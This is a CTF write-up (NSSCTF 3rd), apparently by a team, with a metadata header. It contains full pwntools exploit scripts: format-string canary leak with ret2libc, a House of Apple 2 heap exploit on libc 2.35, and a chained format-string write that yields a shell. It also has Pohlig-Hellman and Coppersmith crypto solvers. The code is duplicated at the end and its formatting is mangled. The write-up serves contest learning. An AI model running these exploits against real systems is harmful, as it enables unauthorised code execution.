---
title: NSSCTF 3rd 部分 writeup (Pwn + Crypto 综合)
contest: NSSCTF
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags:
- libc 2.31 格式化字符串
- libc 2.35 House of Apple 2
- fmt-string 7 次
- Pohlig-Hellman DLP
- Coppersmith small_roots
attack_chain: '|'
key_payload: '|'
one_liner: 'NSSCTF 3rd 部分 writeup: pwn 签到 (cat 1>&2) + ezstack (libc 2.31 fmt+canary) + ezheap (libc 2.35 House of Apple 2) + ezfmt (7 次 fmt 写链) + Crypto Pohlig-Hellman + Coppersmith。'
lesson: '|'
quality: high
full_path: NSSCTF3rd部分writeup.full.md
meta_path: NSSCTF3rd部分writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'NSSCTF 3rd 部分 writeup (Pwn + Crypto 综合)。NSSCTF 3rd 部分 writeup: pwn 签到 (cat 1>&2) + ezstack (libc 2.31 fmt+canary) + ezheap (libc 2.35 House of Apple 2) + ezfmt (7 次 fmt 写链) + Crypto Pohlig-Hellman ...'
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/201662.html
wp_author: ZeroPointZero
reasoning_chain:
- ezstack 触发点：libc 2.31 格式化字符串 + canary 校验 → 假设：泄 canary + ret2libc
- 动作：payload_f = b'--%13$p-' → sla 'canary challenge' → ru(b'--') → 观察：canary = int(ru(b'-')[:-1], 16)
- 假设：ret2libc puts(puts_got) 泄 libc → 动作：sl b'a'*0x28 + p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FD)
- ezheap (libc 2.35)：safe-linking + tcache 填充 7 次 + 泄 libc + key → 假设：劫持 tcache 到 _IO_2_1_stderr
- 动作：add(12, 0xf0, p64(0)*2 + p64(key ^ (libc.sym['_IO_2_1_stderr_']))) → 假设：覆盖 stderr
- '假设：fake_IO + setcontext+61 → 动作：pay = flat({0x00: '' sh;'', 0x18-0x10: libc.sym[''setcontext'']+61, 0x20-0x10: fake_IO_addr, ...}, filler=b''\x00'')'
- ezfmt (7 次 fmt-string)：%9$p-%6$p 泄 libc + stack → %<stack & 0xffff>c%11$hn 写低 2 字节 → %<0x4020+1>c%<6+0x21>$hn 写 main 返回地址
- Crypto Pohlig-Hellman DLP：p 因子分解 2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239 → 假设：对每个 q 算 DLP → CRT
- Coppersmith small_roots：GF(p3rd).nth_root(3, all=True) 找 3 次方根 → CRT(p3rd, n) 组合 → small_roots(X=2^(1200-mm.bit_length()), beta=0.5)
failed_attempts:
- ezstack 试图走 system('/bin/sh') 直接打 → 失败：必须先泄 canary 才能过 stack check
- ezheap 试图走 tcache poisoning 直打 → 失败：libc 2.35 safe-linking 必须先泄 key
- ezfmt 试图单次 fmt-string 改 ret addr → 失败：题目限制 7 次必须分段写（hn 每次 2 字节）
- Crypto 试图直接解 DLP → 失败：p 太大，必须用 Pohlig-Hellman 拆成小素因子 DLP
key_observations:
- libc 2.35 House of Apple 2 = 劫持 tcache 到 _IO_2_1_stderr + fake_IO + setcontext+61 + _IO_wfile_jumps+0x30
- 格式化字符串泄 canary 用 %13$p（栈上特定位置） + ret2libc 用 pop_rdi + puts(puts_got) 泄 libc
- 7 次 fmt-string 限制下用 hn 写 2 字节分段拼地址（每次 %<stack & 0xffff>c%11$hn）
- Pohlig-Hellman DLP = p 因子分解成小素因子 q + 每个 q 解 DLP + CRT 组合
- Coppersmith small_roots(X=2^(1200-mm.bit_length()), beta=0.5) 是大 n 部分已知明文攻击标配
prerequisites:
- glibc heap（safe-linking / tcache / House of Apple 2）
- 格式化字符串漏洞（%p/%n/%hn + 栈偏移）
- Pohlig-Hellman DLP + CRT
- Sage Coppersmith small_roots
---
# NSSCTF3rd部分writeup

> 原文: https://www.ctfiot.com/201662.html
> ID: 201662

战况

war situation

Ranking:第五

Score:
2521

NSS3rd WP by ZeroPointZero

Manufacturing equipment

PART.01

pwn

pwn签到

直接cat不行，需要输出重定向，cat flag 1>&2即可

ezstack

检查保护，开启Canary

主函数很少，有两次漏洞，一个是格式化字符串漏洞，一个是栈溢出

思路就很清晰了，利用格式化字符串泄露canary，然后再进行ret2libc

难受，不给libc，只能远端泄露找偏移，完整EXP如下

from pwn import* from LibcSearcher import* from struct import pack from ctypes import* # io = remote("127.0.0.1", 55299) # io = remote("192.168.170.128", 1234) # io = remote("182.92.237.102", 10015) io = remote("node8.anna.nssctf.cn", 22528) # io = process("./ezstack") # io = remote("3.1.2.3", 8888) # context(os="linux", arch="amd64") context(os="linux", arch="amd64", log_level="debug") elf = ELF('./ezstack') # libc = ELF('./libc-2.23.so') # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc = ELF('/home/yukon/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6') # ctfshow用的ubuntu18.04 lg_infos = [] lga =lambda data: lg_infos.append(data) s =lambda data: io.send(data) sl =lambda data: io.sendline(data) sa =lambda text, data: io.sendafter(text, data) sla =lambda text, data: io.sendlineafter(text, data) r =lambda n: io.recv(n) ru =lambda text: io.recvuntil(text) rl =lambda: io.recvline() uu32 =lambda: u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00')) uu64 =lambda: u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00")) iuu32 =lambda: int(io.recv(10), 16) iuu64 =lambda: int(io.recv(6), 16) uheap =lambda: u64(io.recv(6).ljust(8, b'x00')) # lg = lambda addr: log.success(addr) # lg = lambda addr: log.info(addr) lg =lambda data : io.success('%s -> 0x%x'% (data, eval(str(data)))) ia =lambda: io.interactive() def log_all(): for lg_info in lg_infos: lg(lg_info) def attach(io, gdbscript=""): log_all() gdb.attach(io, gdbscript) def get_sb(): return libc_base + libc.sym['system'], libc_base +next(libc.search(b'/bin/shx00')) # gdb.attach(io) # gdb.attach(io, 'b printf') # gdb.attach(io, 'b *0x4011B4') puts_addr =0x0401261 pop_rdi =0x0000000000401303 payload_f =b'--%13$p-' sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FD)) puts_real = uu64() lg("puts_real") sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts']) + p64(0x4011FD)) printf_real = uu64() lg("printf_real") libc_base = puts_real -0x84420 lib_binsh_addr = libc_base +0x1b45bd lib_system_addr = libc_base +0x52290 # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc_base = puts_real - libc.sym['puts'] # lib_system_addr, lib_binsh_addr = get_sb() # libc = LibcSearcher('puts', puts_real) # lib_system_addr = libc.dump('system') # lib_binsh_addr = libc.dump("str_bin_sh") sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(0x000000000040101a) + p64(pop_rdi) + p64(lib_binsh_addr) + p64(lib_system_addr)) ia() # io.recvuntil("(.*?)") # io.recvuntil(b"$1") # io.sendline(str((.*?))) # io.sendline(str($1).encode())

ezheap

ibc版本为2.35，且保护全开，所以需要考虑用safe-linking，泄露Key，还需要伪造IO结构体来getshell

‘

IDA静态分析，发现需要输入一个登录密码才可以进行后续流程，根据函数逆出密码，就是正常的堆菜单题，总共有add，dele，show三个功能

可以看到，最多创建32个chunk,且每个chunk的大小不超过0x4FF，在dele函数中有UAF漏洞

常规进行tcache填充泄露libc基址和key值，然后劫持tcahce到IO_2_1_stderr 伪造IO后，再申请回来，触发即可getshell

from pwn import*import sys
# Define lambda functions for common operationss =lambda data :io.send(data)sa =lambda delim,data :io.sendafter(delim, data)sl =lambda data :io.sendline(data)sla =lambda delim,data :io.sendlineafter(delim, data)r =lambda num :io.recv(num)ru =lambda delims, drop=True :io.recvuntil(delims, drop)rl =lambda :io.recvline()uu32 =lambda data :
u32(data.ljust(4,b'x00'))uu64 =lambda data :
u64(data.ljust(8,b'x00'))ls =lambda data :
log.success(data)lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x 33[0m'% (s, eval(s)))itr =lambda :io.interactive()
# Context settingscontext.arch ='amd64'context.log_level ='debug'# infocontext.terminal = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):'''Start the exploit against the target.'''if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)elif args.CMD: return process(binary.split(' '))elif args.REM: return remote()elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))''' Usage: python3 exp.py AWD   '''return process([binary] + argv, *a, **kw)
binary ='./pwn'libelf =''
elf = ELF(binary);rop = ROP(binary)libc = ELF('libc.so.6')gdbscript ='''#continue'''.format(**locals())

#import socks#context.proxy = (socks.SOCKS5, '192.168.80.102', 10808)
io = start(binary)

def add(idx,size,text='A'): ru(': ') sl('1') ru(': ') sl(str(idx)) ru(': ') sl(str(size)) ru('t') s(text)
def rm(idx): ru(': ') sl('2') ru(': ') sl(str(idx))
def show(idx): ru(': ') sl('3') ru(': ') sl(str(idx))
ru('n')sl('TLNTQpRgMrjK')
for i inrange(10): add(i,0x100,"A")

for i inrange(7): rm(i)rm(8)show(8)libc_base = uu64(r(6)) -2206944libc.address = libc_baseshow(0)key = uu64(r(5))

rm(7)add(10, 0x100,'hack1')rm(8)add(11, 0xf0, b'hacker2')
add(12, 0xf0, p64(0)*2+ p64(key ^ (libc.sym['_IO_2_1_stderr_'])))

add(13, 0x100)
_stderr = libc.sym['_IO_2_1_stderr_']fake_IO_addr = _stderr
pay = flat({0x00: ' sh;',0x18-0x10: libc.sym['setcontext'] +61,0x20-0x10: fake_IO_addr, # 0x20 > 0x180x18: libc.sym['system'],0xa0: fake_IO_addr-0x10, # 取此地址 +0xe0的地址，但是 在这里是 stdout 的 flags,为了不影响stdout修改0xc0: 1, # mode0xe0-0x10: fake_IO_addr, # 0xe0 0xd8: libc.sym['_IO_wfile_jumps'] +0x30, },filler=b'x00')

#gdb.attach(io,gdbscript)
add(14, 0x100,pay)
lss('libc_base')lss('key')

sl('1')sl('88')sl('88')
itr()

ezfmt

主函数只有这些，标准非栈上格式化字符串，总共·可以利用7次

 

 

常规流程泄露libc基址和栈地址，利用printf成链攻击，但是很大的问题是没有给libc版本，需要远程泄露找，还不一定对，很头疼最后 确定了偏移，把main函数返回地址修改为one_gadget，成功后即可getshell

from pwn import* import sys # Define lambda functions for common operations s =lambda data :io.send(data) sa =lambda delim,data :io.sendafter(delim, data) sl =lambda data :io.sendline(data) sla =lambda delim,data :io.sendlineafter(delim, data) r =lambda num :io.recv(num) ru =lambda delims, drop=True :io.recvuntil(delims, drop) rl =lambda :io.recvline() uu32 =lambda data :
u32(data.ljust(4,b'x00')) uu64 =lambda data :
u64(data.ljust(8,b'x00')) ls =lambda data :
log.success(data) lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x  33[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
except: exit(0) gdbscript =''' b *0x0401242 #continue '''.format(**locals()) io = start(binary) def sp(pay): ru('>') sl(pay) pay ='%9$p-%6$p-' sp(pay) libc_base =int(ru('-'),16) -147587 stack =int(ru('-'),16) -200 lss('libc_base') lss('stack') pay =f'%{stack &0xffff}c%11$hnx00' sp(pay) pay =f'%{0x4020+1}c%{6+0x21}$hnx00' sp(pay) system = libc_base +336528 t1 = (system >>8) &0xFFFF pay =f'%{t1}c%{6+7}$hnx00' sp(pay) itr()

PART.02

Crypto

3rdRSA

三次开根+小因子dlp之后crt然后已m低位攻击恢复m

from Crypto.Util.number import*
def babystep_giantstep(g, y, p, q=None):if q isNone: q = p -1 m =int(q**0.5+0.5) table = {} gr =1for r inrange(m): table[gr] = r gr = (gr * g) % p
try: gm =pow(g, -m, p)
except:
return None ygqm = yfor q inrange(m):if ygqm in table:
return q * m + table[ygqm] ygqm = (ygqm * gm) % preturn None
def pohlig_hellman_DLP(g, y, p): n=1 factors = [2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239] crt_moduli = [] crt_remain = []for q in factors: x = babystep_giantstep(pow(g, (p -1) // q, p), pow(y, (p -1) // q, p), p, q)if (x isNone) or (x <=1): continue crt_moduli.append(q) crt_remain.append(x) n*=q x = crt(crt_remain, crt_moduli)return (x,n)
nss =129063444400395931140552937306125851382394430986439278160593873744789936793795518045323178995007062628298309773582176239691459885773526624534690277511861861603281624682554253545227928169748182762012056234854538541309647111293806528166653033498149834445725530659660926127593831428768095049111056550293489376446453196283413940748453177975852069148305909986767912740830549027892132105563377310203897753966350743874679104628321785862987706430998848051299468409157327409929019736966482807332241638171032488791288702638854996896008055380420273360334533680833179185524820732104480666659321861366843400175400593725077960919448688150587388484016394469887799115548829c1th =34434392180151160913417544852616971692121904677314473399957347521083237373034994312975350004829141725822217771937654823384811574065863494723195053499396034949290411943322317170325058243501037304118017625559902628138026099775011556912632571666551501574674149399754491989755975771939193289559108779735832803131353873359793188227274679870124905519577462789862633176435874379040514994389592895575023493569300837110208625710266981571291166908408795186263690648761483931536077993683195891166866749702144363195471519064199405194909234060054947618318112220998235092847932193233297870660035092387998034397222343161862784190790234800655328367322488558923652724216788c2nd =2607182269911588640317443768516313475146031043011942375047416295563239497652683572392929453795834334601092180070778075446956225213228673291202712614851722328808263442169879046516657696381344172034458368689995793563352685120784745264814592735479698208625232292101406540095075755385738751964408524935105574210332493169531158694712409957008980603987021669723807161080311585592233184680564859608827956836072947637991546257832547921898039818720396103470292159465748053549459040177976994334908062142249458811885621719209965027537964222416346303361195322236614316663222188005352271974634346800843280024794327865267659775840158740927725776164466534809032826708671p3rd =34625024969762267128651307772809623649843622265032692142413571471210174269061639087466847081494470128344958794692961988682025560523709683489711068300641190919761862123159064271694245866486251838863170363349568878104217
xx,n=pohlig_hellman_DLP(3,c2nd,p3rd)R.<x>= PolynomialRing(Zmod(nss//p3rd))for mp in GF(p3rd)(c1th).nth_root(3, all=True): mm=crt([int(mp),int(xx)],[p3rd,n]) f=(x*p3rd*n+mm)^3-c1th root=f.monic().small_roots(X =2^(1200-mm.bit_length()),beta=0.5,epsilon=0.02)if root:
print(long_to_bytes(int(root[0]*p3rd*n+mm)))

PART.03

MISC

guess

在源代码中 使用了一个简单的正则表达式来验证输入是否为纯数字，在这我们可以尝试构造特殊字符进行验证

#!/usr/bin/env sh
set-euo pipefail
min=0max=999999999attempts=5
random_number=$(head -c512 /dev/urandom | tr -dc 0-9| head -c9)

今天，我们揭晓有关NSS比赛PWN,Crypto,MISC方向的练习题目。请大家继续保持关注！

更多资源，敬请关注ZeroPointZero安全团队

END


```
from pwn import* from LibcSearcher import* from struct import pack from ctypes import* # io = remote("127.0.0.1", 55299) # io = remote("192.168.170.128", 1234) # io = remote("182.92.237.102", 10015) io = remote("node8.anna.nssctf.cn", 22528) # io = process("./ezstack") # io = remote("3.1.2.3", 8888) # context(os="linux", arch="amd64") context(os="linux", arch="amd64", log_level="debug") elf = ELF('./ezstack') # libc = ELF('./libc-2.23.so') # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc = ELF('/home/yukon/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6') # ctfshow用的ubuntu18.04 lg_infos = [] lga =lambda data: lg_infos.append(data) s =lambda data: io.send(data) sl =lambda data: io.sendline(data) sa =lambda text, data: io.sendafter(text, data) sla =lambda text, data: io.sendlineafter(text, data) r =lambda n: io.recv(n) ru =lambda text: io.recvuntil(text) rl =lambda: io.recvline() uu32 =lambda: u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00')) uu64 =lambda: u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00")) iuu32 =lambda: int(io.recv(10), 16) iuu64 =lambda: int(io.recv(6), 16) uheap =lambda: u64(io.recv(6).ljust(8, b'x00')) # lg = lambda addr: log.success(addr) # lg = lambda addr: log.info(addr) lg =lambda data : io.success('%s -> 0x%x'% (data, eval(str(data)))) ia =lambda: io.interactive() def log_all(): for lg_info in lg_infos: lg(lg_info) def attach(io, gdbscript=""): log_all() gdb.attach(io, gdbscript) def get_sb(): return libc_base + libc.sym['system'], libc_base +next(libc.search(b'/bin/shx00')) # gdb.attach(io) # gdb.attach(io, 'b printf') # gdb.attach(io, 'b *0x4011B4') puts_addr =0x0401261 pop_rdi =0x0000000000401303 payload_f =b'--%13$p-' sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FD)) puts_real = uu64() lg("puts_real") sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts']) + p64(0x4011FD)) printf_real = uu64() lg("printf_real") libc_base = puts_real -0x84420 lib_binsh_addr = libc_base +0x1b45bd lib_system_addr = libc_base +0x52290 # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc_base = puts_real - libc.sym['puts'] # lib_system_addr, lib_binsh_addr = get_sb() # libc = LibcSearcher('puts', puts_real) # lib_system_addr = libc.dump('system') # lib_binsh_addr = libc.dump("str_bin_sh") sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(0x000000000040101a) + p64(pop_rdi) + p64(lib_binsh_addr) + p64(lib_system_addr)) ia() # io.recvuntil("(.*?)") # io.recvuntil(b"$1") # io.sendline(str((.*?))) # io.sendline(str($1).encode())
from pwn import*import sys
# Define lambda functions for common operationss =lambda data :io.send(data)sa =lambda delim,data :io.sendafter(delim, data)sl =lambda data :io.sendline(data)sla =lambda delim,data :io.sendlineafter(delim, data)r =lambda num :io.recv(num)ru =lambda delims, drop=True :io.recvuntil(delims, drop)rl =lambda :io.recvline()uu32 =lambda data :
u32(data.ljust(4,b'x00'))uu64 =lambda data :
u64(data.ljust(8,b'x00'))ls =lambda data :
log.success(data)lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x 33[0m'% (s, eval(s)))itr =lambda :io.interactive()
# Context settingscontext.arch ='amd64'context.log_level ='debug'# infocontext.terminal = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):'''Start the exploit against the target.'''if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)elif args.CMD: return process(binary.split(' '))elif args.REM: return remote()elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))''' Usage: python3 exp.py AWD   '''return process([binary] + argv, *a, **kw)
binary ='./pwn'libelf =''
elf = ELF(binary);rop = ROP(binary)libc = ELF('libc.so.6')gdbscript ='''#continue'''.format(**locals())

    #import socks#context.proxy = (socks.SOCKS5, '192.168.80.102', 10808)
io = start(binary)

def add(idx,size,text='A'): ru(': ') sl('1') ru(': ') sl(str(idx)) ru(': ') sl(str(size)) ru('t') s(text)
def rm(idx): ru(': ') sl('2') ru(': ') sl(str(idx))
def show(idx): ru(': ') sl('3') ru(': ') sl(str(idx))
ru('n')sl('TLNTQpRgMrjK')
for i inrange(10): add(i,0x100,"A")

for i inrange(7): rm(i)rm(8)show(8)libc_base = uu64(r(6)) -2206944libc.address = libc_baseshow(0)key = uu64(r(5))

rm(7)add(10, 0x100,'hack1')rm(8)add(11, 0xf0, b'hacker2')
add(12, 0xf0, p64(0)*2+ p64(key ^ (libc.sym['_IO_2_1_stderr_'])))

add(13, 0x100)
_stderr = libc.sym['_IO_2_1_stderr_']fake_IO_addr = _stderr
pay = flat({0x00: ' sh;',0x18-0x10: libc.sym['setcontext'] +61,0x20-0x10: fake_IO_addr, # 0x20 > 0x180x18: libc.sym['system'],0xa0: fake_IO_addr-0x10, # 取此地址 +0xe0的地址，但是 在这里是 stdout 的 flags,为了不影响stdout修改0xc0: 1, # mode0xe0-0x10: fake_IO_addr, # 0xe0 0xd8: libc.sym['_IO_wfile_jumps'] +0x30, },filler=b'x00')

    #gdb.attach(io,gdbscript)
add(14, 0x100,pay)
lss('libc_base')lss('key')

sl('1')sl('88')sl('88')
itr()
from pwn import* import sys # Define lambda functions for common operations s =lambda data :io.send(data) sa =lambda delim,data :io.sendafter(delim, data) sl =lambda data :io.sendline(data) sla =lambda delim,data :io.sendlineafter(delim, data) r =lambda num :io.recv(num) ru =lambda delims, drop=True :io.recvuntil(delims, drop) rl =lambda :io.recvline() uu32 =lambda data :
u32(data.ljust(4,b'x00')) uu64 =lambda data :
u64(data.ljust(8,b'x00')) ls =lambda data :
log.success(data) lss =lambda s :ls(' 33[1;31;40m%s --> 0x%x  33[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
except: exit(0) gdbscript =''' b *0x0401242 #continue '''.format(**locals()) io = start(binary) def sp(pay): ru('>') sl(pay) pay ='%9$p-%6$p-' sp(pay) libc_base =int(ru('-'),16) -147587 stack =int(ru('-'),16) -200 lss('libc_base') lss('stack') pay =f'%{stack &0xffff}c%11$hnx00' sp(pay) pay =f'%{0x4020+1}c%{6+0x21}$hnx00' sp(pay) system = libc_base +336528 t1 = (system >>8) &0xFFFF pay =f'%{t1}c%{6+7}$hnx00' sp(pay) itr()
from Crypto.Util.number import*
def babystep_giantstep(g, y, p, q=None):if q isNone: q = p -1 m =int(q**0.5+0.5) table = {} gr =1for r inrange(m): table[gr] = r gr = (gr * g) % p
try: gm =pow(g, -m, p)
except:
return None ygqm = yfor q inrange(m):if ygqm in table:
return q * m + table[ygqm] ygqm = (ygqm * gm) % preturn None
def pohlig_hellman_DLP(g, y, p): n=1 factors = [2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239] crt_moduli = [] crt_remain = []for q in factors: x = babystep_giantstep(pow(g, (p -1) // q, p), pow(y, (p -1) // q, p), p, q)if (x isNone) or (x <=1): continue crt_moduli.append(q) crt_remain.append(x) n*=q x = crt(crt_remain, crt_moduli)return (x,n)
nss =129063444400395931140552937306125851382394430986439278160593873744789936793795518045323178995007062628298309773582176239691459885773526624534690277511861861603281624682554253545227928169748182762012056234854538541309647111293806528166653033498149834445725530659660926127593831428768095049111056550293489376446453196283413940748453177975852069148305909986767912740830549027892132105563377310203897753966350743874679104628321785862987706430998848051299468409157327409929019736966482807332241638171032488791288702638854996896008055380420273360334533680833179185524820732104480666659321861366843400175400593725077960919448688150587388484016394469887799115548829c1th =34434392180151160913417544852616971692121904677314473399957347521083237373034994312975350004829141725822217771937654823384811574065863494723195053499396034949290411943322317170325058243501037304118017625559902628138026099775011556912632571666551501574674149399754491989755975771939193289559108779735832803131353873359793188227274679870124905519577462789862633176435874379040514994389592895575023493569300837110208625710266981571291166908408795186263690648761483931536077993683195891166866749702144363195471519064199405194909234060054947618318112220998235092847932193233297870660035092387998034397222343161862784190790234800655328367322488558923652724216788c2nd =2607182269911588640317443768516313475146031043011942375047416295563239497652683572392929453795834334601092180070778075446956225213228673291202712614851722328808263442169879046516657696381344172034458368689995793563352685120784745264814592735479698208625232292101406540095075755385738751964408524935105574210332493169531158694712409957008980603987021669723807161080311585592233184680564859608827956836072947637991546257832547921898039818720396103470292159465748053549459040177976994334908062142249458811885621719209965027537964222416346303361195322236614316663222188005352271974634346800843280024794327865267659775840158740927725776164466534809032826708671p3rd =34625024969762267128651307772809623649843622265032692142413571471210174269061639087466847081494470128344958794692961988682025560523709683489711068300641190919761862123159064271694245866486251838863170363349568878104217
xx,n=pohlig_hellman_DLP(3,c2nd,p3rd)R.<x>= PolynomialRing(Zmod(nss//p3rd))for mp in GF(p3rd)(c1th).nth_root(3, all=True): mm=crt([int(mp),int(xx)],[p3rd,n]) f=(x*p3rd*n+mm)^3-c1th root=f.monic().small_roots(X =2^(1200-mm.bit_length()),beta=0.5,epsilon=0.02)if root:
print(long_to_bytes(int(root[0]*p3rd*n+mm)))
#!/usr/bin/env sh
set-euo pipefail
min=0max=999999999attempts=5
random_number=$(head -c512 /dev/urandom | tr -dc 0-9| head -c9)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]